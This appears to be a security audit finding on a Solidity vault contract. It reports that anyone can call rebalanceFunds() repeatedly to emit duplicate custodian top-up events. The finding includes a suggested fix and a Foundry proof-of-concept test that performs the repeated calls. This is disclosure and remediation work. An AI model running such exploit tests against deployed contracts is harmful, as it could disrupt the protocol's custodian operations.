## Title
Duplicate Event Emission in FastAccessVault.rebalanceFunds Enables Event Log Spam and Potential Custodian Over-funding

## Summary
The `rebalanceFunds()` function in FastAccessVault lacks state tracking to prevent duplicate event emissions when multiple users call it in the same block during underfunded conditions. This enables any user to spam `TopUpRequestedFromCustodian` events, potentially causing off-chain custodian systems to process multiple top-up requests for the same rebalancing need.

## Impact
**Severity**: Medium

## Finding Description
**Location:** `src/protocol/FastAccessVault.sol` - `rebalanceFunds()` function (lines 165-181) [1](#0-0) 

**Intended Logic:** The function should trigger a rebalancing operation to maintain optimal buffer levels, requesting top-up from the custodian when underfunded or transferring excess when overfunded.

**Actual Logic:** When the vault is underfunded, the function only emits a `TopUpRequestedFromCustodian` event without modifying any contract state. Multiple transactions calling this function in the same block (or before custodian tops up) will all read identical state values and emit duplicate events. [2](#0-1) 

The function has no access control modifier (despite interface documentation suggesting "Only callable by owner"), as confirmed by tests that explicitly verify public access: [3](#0-2) 

**Exploitation Path:**
1. **Initial State**: FastAccessVault is underfunded (e.g., 100k DLF tokens, target is 500k)
2. **Transaction 1**: User A calls `rebalanceFunds()` → reads currentBalance (100k), calculates needed (400k), emits `TopUpRequestedFromCustodian(custodian, 400k, 500k)`
3. **Transaction 2** (same block): User B calls `rebalanceFunds()` → reads same currentBalance (100k), calculates same needed (400k), emits identical `TopUpRequestedFromCustodian(custodian, 400k, 500k)`
4. **Transaction 3-N**: Additional users continue emitting duplicate events with identical parameters
5. **Outcome**: Off-chain custodian monitoring system sees N identical events for the same rebalancing need

**Security Property Broken:** The protocol's liquidity management system can be manipulated to emit misleading operational signals. If the custodian processes events without deduplication, the vault could receive N times the required top-up amount, breaking the intended buffer sizing strategy defined by `targetBufferPercentageBPS` and `minimumExpectedBalance`.

## Impact Explanation
- **Affected Assets**: FastAccessVault's DLF token buffer and protocol liquidity allocation
- **Damage Severity**: 
  - **Event Log Spam**: Attackers can fill event logs with duplicate rebalancing requests at minimal gas cost
  - **Custodian Confusion**: Off-chain systems monitoring `TopUpRequestedFromCustodian` events may incorrectly interpret N events as N separate rebalancing needs
  - **Potential Over-funding**: If custodian processes each event independently, the vault could receive multiple top-ups (e.g., 10 events × 400k = 4M DLF instead of 400k), holding significantly more liquidity than the configured target buffer percentage
  - **Liquidity Misallocation**: Excess DLF locked in FastAccessVault reduces capital efficiency for the broader protocol
- **User Impact**: All protocol users are affected indirectly through inefficient liquidity allocation. Attackers can exploit this at minimal cost (only gas fees) to disrupt operational processes.

## Likelihood Explanation
- **Attacker Profile**: Any unprivileged user can exploit this vulnerability - no special permissions required
- **Preconditions**: FastAccessVault must be in an underfunded state (currentBalance < targetBalance), which naturally occurs after `processTransfer()` calls for iTRY redemptions
- **Execution Complexity**: Trivial - single transaction with no parameters required. Can be automated or called multiple times by different addresses in the same block
- **Frequency**: Continuously exploitable while the vault remains underfunded. An attacker can submit N transactions in each block until custodian tops up the vault

## Recommendation

Add state tracking to prevent duplicate event emissions within a reasonable time window or until the rebalancing need changes:

```solidity
// In src/protocol/FastAccessVault.sol:

// ADD new state variables:
uint256 private lastRebalanceBlock;
uint256 private lastRebalanceTarget;
uint256 private lastRebalanceNeeded;

// MODIFY rebalanceFunds() function (lines 165-181):
function rebalanceFunds() external {
    uint256 aumReferenceValue = _issuerContract.getCollateralUnderCustody();
    uint256 targetBalance = _calculateTargetBufferBalance(aumReferenceValue);
    uint256 currentBalance = _vaultToken.balanceOf(address(this));

    if (currentBalance < targetBalance) {
        uint256 needed = targetBalance - currentBalance;
        
        // Prevent duplicate events in same block with same parameters
        if (block.number == lastRebalanceBlock 
            && needed == lastRebalanceNeeded 
            && targetBalance == lastRebalanceTarget) {
            revert DuplicateRebalanceRequest();
        }
        
        lastRebalanceBlock = block.number;
        lastRebalanceNeeded = needed;
        lastRebalanceTarget = targetBalance;
        
        emit TopUpRequestedFromCustodian(address(custodian), needed, targetBalance);
    } else if (currentBalance > targetBalance) {
        uint256 excess = currentBalance - targetBalance;
        
        // Reset tracking when vault is balanced/overfunded
        lastRebalanceBlock = 0;
        lastRebalanceNeeded = 0;
        lastRebalanceTarget = 0;
        
        if (!_vaultToken.transfer(custodian, excess)) {
            revert CommonErrors.TransferFailed();
        }
        emit ExcessFundsTransferredToCustodian(address(custodian), excess, targetBalance);
    }
}
```

**Alternative Mitigation:** Add `onlyOwner` modifier to restrict function access as originally documented in the interface, preventing arbitrary users from triggering rebalancing operations:

```solidity
function rebalanceFunds() external onlyOwner {
    // existing implementation
}
```

## Proof of Concept

```solidity
// File: test/Exploit_DuplicateRebalanceEvents.t.sol
// Run with: forge test --match-test test_DuplicateRebalanceEvents -vvv

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/protocol/FastAccessVault.sol";
import "../src/protocol/iTryIssuer.sol";
import "./mocks/MockERC20.sol";

contract Exploit_DuplicateRebalanceEvents is Test {
    FastAccessVault vault;
    MockERC20 vaultToken;
    MockiTryIssuer issuerContract;
    
    address owner = address(0x1);
    address custodian = address(0x2);
    address attacker1 = address(0x3);
    address attacker2 = address(0x4);
    address attacker3 = address(0x5);
    
    event TopUpRequestedFromCustodian(address indexed custodian, uint256 amount, uint256 targetBalance);
    
    function setUp() public {
        // Deploy mock token and issuer
        vaultToken = new MockERC20("DLF", "DLF", 18);
        issuerContract = new MockiTryIssuer();
        
        // Deploy FastAccessVault
        vault = new FastAccessVault(
            address(vaultToken),
            address(issuerContract),
            custodian,
            500, // 5% target buffer
            50_000e18, // 50k minimum
            owner
        );
        
        // Setup: Vault is underfunded
        vaultToken.mint(address(vault), 100_000e18);
        issuerContract.setCollateralUnderCustody(10_000_000e18); // 10M AUM
        // Target should be max(5% * 10M, 50k) = 500k
        // Current: 100k, Needed: 400k
    }
    
    function test_DuplicateRebalanceEvents() public {
        // SETUP: Verify initial state
        uint256 currentBalance = vault.getAvailableBalance();
        assertEq(currentBalance, 100_000e18, "Initial balance should be 100k");
        
        uint256 targetBalance = 500_000e18; // 5% of 10M
        uint256 needed = 400_000e18;
        
        // EXPLOIT: Multiple users call rebalanceFunds in same block
        
        // Attacker 1 calls rebalanceFunds
        vm.expectEmit(true, false, false, true, address(vault));
        emit TopUpRequestedFromCustodian(custodian, needed, targetBalance);
        vm.prank(attacker1);
        vault.rebalanceFunds();
        
        // Attacker 2 calls rebalanceFunds (same block, no state change)
        vm.expectEmit(true, false, false, true, address(vault));
        emit TopUpRequestedFromCustodian(custodian, needed, targetBalance);
        vm.prank(attacker2);
        vault.rebalanceFunds();
        
        // Attacker 3 calls rebalanceFunds (same block, no state change)
        vm.expectEmit(true, false, false, true, address(vault));
        emit TopUpRequestedFromCustodian(custodian, needed, targetBalance);
        vm.prank(attacker3);
        vault.rebalanceFunds();
        
        // VERIFY: Vault balance unchanged (only events emitted)
        assertEq(
            vault.getAvailableBalance(), 
            100_000e18, 
            "Vulnerability confirmed: Multiple identical events emitted without state change"
        );
        
        // Additional verification: Can continue in next block
        vm.roll(block.number + 1);
        vm.expectEmit(true, false, false, true, address(vault));
        emit TopUpRequestedFromCustodian(custodian, needed, targetBalance);
        vm.prank(attacker1);
        vault.rebalanceFunds();
    }
}

contract MockiTryIssuer {
    uint256 private collateral;
    
    function setCollateralUnderCustody(uint256 amount) external {
        collateral = amount;
    }
    
    function getCollateralUnderCustody() external view returns (uint256) {
        return collateral;
    }
}
```

**Notes:**
- The vulnerability exists because the underfunded branch only emits events without modifying contract state, allowing multiple transactions to read identical values
- The test suite explicitly confirms public access is intentional (line 825-840), but does not test the duplicate event scenario within the same block
- While well-designed off-chain systems should deduplicate events by comparing parameters, the protocol should not rely solely on off-chain safeguards for operational integrity
- The interface documentation incorrectly states the function is "Only callable by owner" but the implementation has no such restriction, suggesting a potential implementation oversight

### Citations

**File:** src/protocol/FastAccessVault.sol (L165-181)
```text
    function rebalanceFunds() external {
        uint256 aumReferenceValue = _issuerContract.getCollateralUnderCustody();
        uint256 targetBalance = _calculateTargetBufferBalance(aumReferenceValue);
        uint256 currentBalance = _vaultToken.balanceOf(address(this));

        if (currentBalance < targetBalance) {
            uint256 needed = targetBalance - currentBalance;
            // Emit event for off-chain custodian to process
            emit TopUpRequestedFromCustodian(address(custodian), needed, targetBalance);
        } else if (currentBalance > targetBalance) {
            uint256 excess = currentBalance - targetBalance;
            if (!_vaultToken.transfer(custodian, excess)) {
                revert CommonErrors.TransferFailed();
            }
            emit ExcessFundsTransferredToCustodian(address(custodian), excess, targetBalance);
        }
    }
```

**File:** test/FastAccessVault.t.sol (L825-840)
```text
    function test_rebalanceFunds_whenCalledByAnyone_succeeds() public {
        _setupVaultWithBalance(100_000e18);

        // Call from different addresses
        vm.prank(user1);
        vault.rebalanceFunds();

        vm.prank(attacker);
        vault.rebalanceFunds();

        vm.prank(custodian);
        vault.rebalanceFunds();

        // Should not revert
        assertTrue(true, "Anyone should be able to call rebalanceFunds");
    }
```
